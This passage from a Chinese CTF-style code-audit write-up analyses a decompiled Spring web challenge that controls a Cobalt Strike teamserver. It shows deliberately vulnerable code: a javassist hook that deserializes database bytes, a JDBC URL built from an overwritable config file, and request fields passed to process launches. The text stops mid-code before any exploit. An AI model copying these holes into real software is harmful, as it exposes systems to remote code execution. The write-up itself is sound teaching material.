<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h3 data-content="1" id="dc78b29a42c8e45c1b56928bc833b699">CS代码审计分析任意文件覆盖漏洞</h3>
<p>路由主要代码如下，IndexController.java</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">org.example.ez_web.controller</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.io.BufferedReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.BufferedWriter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.File</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileWriter</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.InputStreamReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.stereotype.Controller</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.ui.Model</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="o">;</span>

<span class="nd">@Controller</span>
<span class="cm">/* loaded from: IndexController.class */</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">IndexController</span> <span class="o">{</span>
    <span class="nd">@RequestMapping</span><span class="o">({</span><span class="s">"/"</span><span class="o">})</span>
    <span class="kd">public</span> <span class="n">String</span> <span class="nf">index</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">return</span> <span class="s">"index"</span><span class="o">;</span>
    <span class="o">}</span>

    <span class="nd">@RequestMapping</span><span class="o">({</span><span class="s">"/RunCSByMySelf"</span><span class="o">})</span>
    <span class="kd">public</span> <span class="n">String</span> <span class="nf">RunCS</span><span class="o">(</span><span class="n">Model</span> <span class="n">model</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
        <span class="n">String</span> <span class="n">C2ip</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedReader</span><span class="o">(</span><span class="k">new</span> <span class="n">InputStreamReader</span><span class="o">(</span><span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="s">"hostname"</span><span class="o">,</span> <span class="s">"-I"</span><span class="o">).</span><span class="na">start</span><span class="o">().</span><span class="na">getInputStream</span><span class="o">())).</span><span class="na">readLine</span><span class="o">().</span><span class="na">split</span><span class="o">(</span><span class="s">"\\s+"</span><span class="o">)[</span><span class="mi">0</span><span class="o">];</span>
        <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">"C2ip"</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">join</span><span class="o">(</span><span class="s">"\n"</span><span class="o">,</span> <span class="n">C2ip</span><span class="o">));</span>
        <span class="k">if</span> <span class="o">(</span><span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">"CSRun.sh"</span><span class="o">).</span><span class="na">exists</span><span class="o">())</span> <span class="o">{</span>
            <span class="k">return</span> <span class="s">"ip"</span><span class="o">;</span>
        <span class="o">}</span>
        <span class="n">String</span> <span class="n">content</span> <span class="o">=</span> <span class="s">"cd /tmp/CS;./teamserver "</span> <span class="o">+</span> <span class="n">C2ip</span> <span class="o">+</span> <span class="s">" 123456 &amp;"</span><span class="o">;</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">BufferedWriter</span> <span class="n">writer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">BufferedWriter</span><span class="o">(</span><span class="k">new</span> <span class="n">FileWriter</span><span class="o">(</span><span class="s">"CSRun.sh"</span><span class="o">));</span>
            <span class="n">writer</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="n">content</span><span class="o">);</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">writer</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">if</span> <span class="o">(</span><span class="mi">0</span> <span class="o">!=</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                    <span class="n">writer</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
                <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                    <span class="n">writer</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
                <span class="o">}</span>
            <span class="o">}</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
        <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="s">"chmod"</span><span class="o">,</span> <span class="s">"+x"</span><span class="o">,</span> <span class="s">"./CSRun.sh"</span><span class="o">).</span><span class="na">start</span><span class="o">().</span><span class="na">waitFor</span><span class="o">();</span>
        <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="s">"./CSRun.sh"</span><span class="o">).</span><span class="na">start</span><span class="o">();</span>
        <span class="k">return</span> <span class="s">"ip"</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>这段就是写入文件然后在靶机本地启动脚本运行了一个CS</p>
<p>DatabaseConnect.java</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">org.example.ez_web.utils</span><span class="o">;</span>  

<span class="kn">import</span> <span class="nn">com.jayway.jsonpath.JsonPath</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">com.jayway.jsonpath.Predicate</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.nio.file.Paths</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.sql.Connection</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.sql.DriverManager</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.sql.SQLException</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.util.Properties</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.util.stream.Collectors</span><span class="o">;</span>  

<span class="cm">/* loaded from: DatabaseConnect.class */</span>  
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">DatabaseConnect</span> <span class="o">{</span>  
    <span class="kd">private</span> <span class="n">String</span> <span class="n">url</span><span class="o">;</span>  
    <span class="kd">private</span> <span class="n">String</span> <span class="n">ip</span><span class="o">;</span>  
    <span class="kd">private</span> <span class="n">String</span> <span class="n">port</span><span class="o">;</span>  
    <span class="kd">private</span> <span class="n">String</span> <span class="n">dbname</span><span class="o">;</span>  
    <span class="kd">private</span> <span class="n">Connection</span> <span class="n">connection</span><span class="o">;</span>  

    <span class="kd">public</span> <span class="nf">DatabaseConnect</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>  
        <span class="n">String</span> <span class="n">json</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">Files</span><span class="o">.</span><span class="na">lines</span><span class="o">(</span><span class="n">Paths</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"/tmp/config.json"</span><span class="o">,</span> <span class="k">new</span> <span class="n">String</span><span class="o">[</span><span class="mi">0</span><span class="o">])).</span><span class="na">collect</span><span class="o">(</span><span class="n">Collectors</span><span class="o">.</span><span class="na">joining</span><span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">lineSeparator</span><span class="o">()));</span>  
        <span class="k">this</span><span class="o">.</span><span class="na">ip</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">JsonPath</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">json</span><span class="o">,</span> <span class="s">"$.ip"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Predicate</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>  
        <span class="k">this</span><span class="o">.</span><span class="na">port</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">JsonPath</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">json</span><span class="o">,</span> <span class="s">"$.port"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Predicate</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>  
        <span class="k">this</span><span class="o">.</span><span class="na">dbname</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span> <span class="n">JsonPath</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">json</span><span class="o">,</span> <span class="s">"$.dbname"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Predicate</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>  
        <span class="k">this</span><span class="o">.</span><span class="na">url</span> <span class="o">=</span> <span class="s">"jdbc:mysql://"</span> <span class="o">+</span> <span class="k">this</span><span class="o">.</span><span class="na">ip</span> <span class="o">+</span> <span class="s">":"</span> <span class="o">+</span> <span class="k">this</span><span class="o">.</span><span class="na">port</span> <span class="o">+</span> <span class="s">"/"</span> <span class="o">+</span> <span class="k">this</span><span class="o">.</span><span class="na">dbname</span><span class="o">;</span>  
    <span class="o">}</span>  
    <span class="kd">public</span> <span class="n">Connection</span> <span class="nf">connect</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">SQLException</span> <span class="o">{</span>  
        <span class="k">if</span> <span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">connection</span> <span class="o">==</span> <span class="kc">null</span> <span class="o">||</span> <span class="k">this</span><span class="o">.</span><span class="na">connection</span><span class="o">.</span><span class="na">isClosed</span><span class="o">())</span> <span class="o">{</span>  
            <span class="k">try</span> <span class="o">{</span>  
                <span class="n">Properties</span> <span class="n">properties</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Properties</span><span class="o">();</span>  
                <span class="n">properties</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span><span class="s">"allowLoadLocalInfile"</span><span class="o">,</span> <span class="s">"false"</span><span class="o">);</span>  
                <span class="n">properties</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span><span class="s">"allowUrlInLocalInfile"</span><span class="o">,</span> <span class="s">"false"</span><span class="o">);</span>  
                <span class="n">properties</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span><span class="s">"allowLoadLocalInfileInPath"</span><span class="o">,</span> <span class="s">""</span><span class="o">);</span>  
                <span class="n">properties</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span><span class="s">"user"</span><span class="o">,</span> <span class="s">"root"</span><span class="o">);</span>  
                <span class="n">properties</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span><span class="s">"password"</span><span class="o">,</span> <span class="s">"root"</span><span class="o">);</span>  
                <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"com.mysql.jdbc.Driver"</span><span class="o">);</span>  
                <span class="k">this</span><span class="o">.</span><span class="na">connection</span> <span class="o">=</span> <span class="n">DriverManager</span><span class="o">.</span><span class="na">getConnection</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">url</span><span class="o">,</span> <span class="n">properties</span><span class="o">);</span>  
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>  
                <span class="k">throw</span> <span class="k">new</span> <span class="n">SQLException</span><span class="o">(</span><span class="s">"MySQL 驱动加载失败"</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>  
            <span class="o">}</span>        <span class="o">}</span>        <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">connection</span><span class="o">;</span>  
    <span class="o">}}</span>
</pre></div>
<p>jdbc数据库连接用的是参数拼接如果可控文件内容就会存在漏洞，解释一下字段读取的方法</p>
<ul>
<li>
<p><strong><code>JsonPath.read</code> 方法</strong>：</p>
<ul>
<li>这是 JsonPath 库提供的静态方法，用于从 JSON 文档中提取数据。</li>
<li>第一个参数是 JSON 文档（通常是一个 <code>String</code> 或 <code>JSONObject</code> 对象）。</li>
<li>第二个参数是 JsonPath 表达式，用于指定要提取的字段。</li>
<li>第三个参数（<code>new Predicate[0]</code>）是可选参数，通常用于添加过滤条件。</li>
</ul>
</li>
<li>
<p><strong>字段提取</strong>：</p>
<ul>
<li>
<strong><code>ScriptType</code></strong>：提取 JSON 中的 <code>$.type</code> 字段。</li>
<li>
<strong><code>CSIp</code></strong>：提取 JSON 中的 <code>$.data.ip</code> 字段。</li>
<li>
<strong><code>CSPort</code></strong>：提取 JSON 中的 <code>$.data.port</code> 字段。</li>
<li>
<strong><code>CSUserName</code></strong>：提取 JSON 中的 <code>$.data.username</code> 字段。</li>
<li>
<strong><code>CSPassWord</code></strong>：提取 JSON 中的 <code>$.data.password</code> 字段。</li>
</ul>
</li>
<li>
<strong>示例 JSON</strong>： 假设 JSON 数据如下：</li>
</ul>
<div class="highlight"><pre><span></span><span class="p">{</span>
    <span class="nt">"type"</span><span class="p">:</span> <span class="s2">"exampleType"</span><span class="p">,</span>
    <span class="nt">"data"</span><span class="p">:</span> <span class="p">{</span>
        <span class="nt">"ip"</span><span class="p">:</span> <span class="s2">"192.168.1.1"</span><span class="p">,</span>
        <span class="nt">"port"</span><span class="p">:</span> <span class="s2">"8080"</span><span class="p">,</span>
        <span class="nt">"username"</span><span class="p">:</span> <span class="s2">"admin"</span><span class="p">,</span>
        <span class="nt">"password"</span><span class="p">:</span> <span class="s2">"123456"</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>
<p>check.java</p>
<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">org.example.ez_web.utils</span><span class="o">;</span>  

<span class="kn">import</span> <span class="nn">javassist.ClassPool</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">javassist.CtClass</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">javassist.CtNewMethod</span><span class="o">;</span>  

<span class="cm">/* loaded from: CheckClass.class */</span>  
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CheckClass</span> <span class="o">{</span>  
    <span class="kd">public</span> <span class="nf">CheckClass</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>  
        <span class="n">CtClass</span> <span class="n">ctClass0</span> <span class="o">=</span> <span class="n">ClassPool</span><span class="o">.</span><span class="na">getDefault</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="s">"com.mysql.jdbc.ResultSetImpl"</span><span class="o">);</span>  
        <span class="n">ctClass0</span><span class="o">.</span><span class="na">removeMethod</span><span class="o">(</span><span class="n">ctClass0</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"getBytes"</span><span class="o">));</span>  
        <span class="n">ctClass0</span><span class="o">.</span><span class="na">addMethod</span><span class="o">(</span><span class="n">CtNewMethod</span><span class="o">.</span><span class="na">make</span><span class="o">(</span><span class="s">"public byte[] getBytes(int columnIndex) throws java.lang.Exception {\n    byte[] data = this.getBytes(columnIndex, false);\n    java.io.ByteArrayInputStream bytesIn = new java.io.ByteArrayInputStream(data);\n    java.io.ObjectInputStream objIn = new org.example.ez_web.utils.NewObjectInputStream(bytesIn);\n    objIn.readObject();\n    return data;\n}"</span><span class="o">,</span> <span class="n">ctClass0</span><span class="o">));</span>  
        <span class="n">ctClass0</span><span class="o">.</span><span class="na">toClass</span><span class="o">();</span>  
    <span class="o">}}</span>
</pre></div>
<p>这个工具类实使用 <code>CtNewMethod.make</code> 方法定义新的方法并添加到类中，并且新写入的方法有反序列化漏洞，<br/>
该类在jdbc进行sql语句执行时候会触发，而我们的doScript路由就会执行SQL查询</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20241203235737-51849eae-b18f-1.png"/></p>
<p>ConnectController.java</p>
<div class="highlight"><pre><span></span><span class="c1">// Source code is decompiled from a .class file using FernFlower decompiler.</span>
<span class="kn">package</span> <span class="nn">org.example.ez_web.controller</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">com.jayway.jsonpath.JsonPath</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">com.jayway.jsonpath.Predicate</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.File</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.sql.Connection</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.sql.PreparedStatement</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.Scanner</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.example.ez_web.utils.DatabaseConnect</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.stereotype.Controller</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.ui.Model</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestBody</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">org.springframework.web.bind.annotation.RequestMethod</span><span class="o">;</span>

<span class="nd">@Controller</span>
<span class="nd">@RequestMapping</span><span class="o">({</span><span class="s">"/connect"</span><span class="o">})</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">ConnectController</span> <span class="o">{</span>
   <span class="kd">static</span> <span class="n">String</span> <span class="n">AgScriptPath</span> <span class="o">=</span> <span class="s">"/tmp/CS"</span><span class="o">;</span>
   <span class="kd">static</span> <span class="n">String</span> <span class="n">ListenerType</span> <span class="o">=</span> <span class="s">"windows/beacon_http/reverse_http"</span><span class="o">;</span>

   <span class="kd">public</span> <span class="nf">ConnectController</span><span class="o">()</span> <span class="o">{</span>
   <span class="o">}</span>

   <span class="nd">@RequestMapping</span><span class="o">({</span><span class="s">"/index"</span><span class="o">})</span>
   <span class="kd">public</span> <span class="n">String</span> <span class="nf">index</span><span class="o">()</span> <span class="o">{</span>
      <span class="k">return</span> <span class="s">"connect/index"</span><span class="o">;</span>
   <span class="o">}</span>

   <span class="nd">@RequestMapping</span><span class="o">(</span>
      <span class="n">value</span> <span class="o">=</span> <span class="o">{</span><span class="s">"/doScript"</span><span class="o">},</span>
      <span class="n">method</span> <span class="o">=</span> <span class="o">{</span><span class="n">RequestMethod</span><span class="o">.</span><span class="na">POST</span><span class="o">}</span>
   <span class="o">)</span>
   <span class="kd">public</span> <span class="n">String</span> <span class="nf">doScript</span><span class="o">(</span><span class="nd">@RequestBody</span> <span class="n">String</span> <span class="n">json</span><span class="o">,</span> <span class="n">Model</span> <span class="n">model</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
      <span class="n">String</span> <span class="n">ScriptType</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">JsonPath</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">json</span><span class="o">,</span> <span class="s">"$.type"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Predicate</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
      <span class="n">String</span> <span class="n">CSIp</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">JsonPath</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">json</span><span class="o">,</span> <span class="s">"$.data.ip"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Predicate</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
      <span class="n">String</span> <span class="n">CSPort</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">JsonPath</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">json</span><span class="o">,</span> <span class="s">"$.data.port"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Predicate</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
      <span class="n">String</span> <span class="n">CSUserName</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">JsonPath</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">json</span><span class="o">,</span> <span class="s">"$.data.username"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Predicate</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
      <span class="n">String</span> <span class="n">CSPassWord</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">JsonPath</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">json</span><span class="o">,</span> <span class="s">"$.data.password"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Predicate</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
      <span class="n">Process</span> <span class="n">process</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
      <span class="n">String</span> <span class="n">query</span> <span class="o">=</span> <span class="s">"INSERT INTO cs_Type (Type) VALUES (?)"</span><span class="o">;</span>

      <span class="k">try</span> <span class="o">{</span>
         <span class="n">Connection</span> <span class="n">connect</span> <span class="o">=</span> <span class="o">(</span><span class="k">new</span> <span class="n">DatabaseConnect</span><span class="o">()).</span><span class="na">connect</span><span class="o">();</span>
         <span class="n">Throwable</span> <span class="n">var11</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

         <span class="k">try</span> <span class="o">{</span>
            <span class="n">PreparedStatement</span> <span class="n">ps</span> <span class="o">=</span> <span class="n">connect</span><span class="o">.</span><span class="na">prepareStatement</span><span class="o">(</span><span class="n">query</span><span class="o">);</span>
            <span class="n">Throwable</span> <span class="n">var13</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>

            <span class="k">try</span> <span class="o">{</span>
               <span class="n">ps</span><span class="o">.</span><span class="na">setString</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="n">ScriptType</span><span class="o">);</span>
               <span class="n">ps</span><span class="o">.</span><span class="na">executeUpdate</span><span class="o">();</span>
            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">var63</span><span class="o">)</span> <span class="o">{</span>
               <span class="n">var13</span> <span class="o">=</span> <span class="n">var63</span><span class="o">;</span>
               <span class="k">throw</span> <span class="n">var63</span><span class="o">;</span>
            <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
               <span class="k">if</span> <span class="o">(</span><span class="n">ps</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                  <span class="k">if</span> <span class="o">(</span><span class="n">var13</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                     <span class="k">try</span> <span class="o">{</span>
                        <span class="n">ps</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
                     <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">var62</span><span class="o">)</span> <span class="o">{</span>
                        <span class="n">var13</span><span class="o">.</span><span class="na">addSuppressed</span><span class="o">(</span><span class="n">var62</span><span class="o">);</span>
                     <span class="o">}</span>
                  <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                     <span class="n">ps</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
                  <span class="o">}</span>
               <span class="o">}</span>

            <span class="o">}</span>
         <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">var68</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">var11</span> <span class="o">=</span> <span class="n">var68</span><span class="o">;</span>
            <span class="k">throw</span> <span class="n">var68</span><span class="o">;</span>
         <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">connect</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
               <span class="k">if</span> <span class="o">(</span><span class="n">var11</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                  <span class="k">try</span> <span class="o">{</span>
                     <span class="n">connect</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
                  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">var61</span><span class="o">)</span> <span class="o">{</span>
                     <span class="n">var11</span><span class="o">.</span><span class="na">addSuppressed</span><span class="o">(</span><span class="n">var61</span><span class="o">);</span>
                  <span class="o">}</span>
               <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
                  <span class="n">connect</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
               <span class="o">}</span>
            <span class="o">}</span>

         <span class="o">}</span>
      <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">var70</span><span class="o">)</span> <span class="o">{</span>
         <span class="n">var70</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
      <span class="o">}</span>

      <span class="n">String</span> <span class="n">SocksPort</span><span class="o">;</span>
      <span class="n">String</span> <span class="n">beaconid</span><span class="o">;</span>
      <span class="n">ProcessBuilder</span> <span class="n">pb</span><span class="o">;</span>
      <span class="k">if</span> <span class="o">(</span><span class="n">ScriptType</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"&amp;beacon_shell"</span><span class="o">))</span> <span class="o">{</span>
         <span class="n">SocksPort</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">JsonPath</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">json</span><span class="o">,</span> <span class="s">"$.data.cmd"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Predicate</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
         <span class="n">beaconid</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">JsonPath</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">json</span><span class="o">,</span> <span class="s">"$.data.beaconid"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Predicate</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
         <span class="n">pb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"python3"</span><span class="o">,</span> <span class="s">"/tmp/index.py"</span><span class="o">,</span> <span class="s">"beacon_shell"</span><span class="o">,</span> <span class="n">CSIp</span><span class="o">,</span> <span class="n">CSPort</span><span class="o">,</span> <span class="n">CSUserName</span><span class="o">,</span> <span class="n">CSPassWord</span><span class="o">,</span> <span class="n">AgScriptPath</span><span class="o">,</span> <span class="n">beaconid</span><span class="o">,</span> <span class="n">SocksPort</span><span class="o">});</span>
         <span class="n">pb</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
      <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">ScriptType</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"&amp;create_http_listener"</span><span class="o">))</span> <span class="o">{</span>
         <span class="n">SocksPort</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">JsonPath</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">json</span><span class="o">,</span> <span class="s">"$.data.ListenerIp"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Predicate</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
         <span class="n">beaconid</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">JsonPath</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">json</span><span class="o">,</span> <span class="s">"$.data.ListenerName"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Predicate</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
         <span class="n">String</span> <span class="n">ListenerPort</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">JsonPath</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">json</span><span class="o">,</span> <span class="s">"$.data.ListenerPort"</span><span class="o">,</span> <span class="k">new</span> <span class="n">Predicate</span><span class="o">[</span><span class="mi">0</span><span class="o">]);</span>
         <span class="n">ProcessBuilder</span> <span class="n">pb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"python3"</span><span class="o">,</span> <span class="s">"/tmp/index.py"</span><span class="o">,</span> <span class="s">"create_http_listener"</span><span class="o">,</span> <span class="n">CSIp</span><span class="o">,</span> <span class="n">CSPort</span><span class="o">,</span> <span class="n">CSUserName</span><span class="o">,</span> <span class="n">CSPassWord</span><span class="o">,</span> <span class="n">AgScriptPath</span><span class="o">,</span> <span class="n">beaconid</span><span class="o">,</span> <span class="n">ListenerType</span><span class="o">,</span> <span class="n">SocksPort</span><span class="o">,</span> <span class="n">ListenerPort</span><span class="o">});</span>
         <span class="n">pb</span><span class="o">.</span><span class="na">start</span><span class="o">();</span>
      <span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">ScriptType</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"&amp;get_beacons"</span><span class="o">))</span> <span class="o">{</span>
         <span class="n">ProcessBuilder</span> <span class="n">pb</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ProcessBuilder</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">[]{</span><span class="s">"python3"</span><span class="o">,</span> <span class="s">"/tmp/index.py"</span><span class="o">,</span> <span class="s">"get_beacons"</span><span class="o">,</span> <span class="n">CSIp</span><span class="o">,</span> <span class="n">CSPort</span><span class="o">,</span> <span class="n">CSUserName</span><span class="o">,</span> <span class="n">CSPassWord</span><span class="o">,</span> <span class="n">AgScriptPath</span><span class="o">});</span>
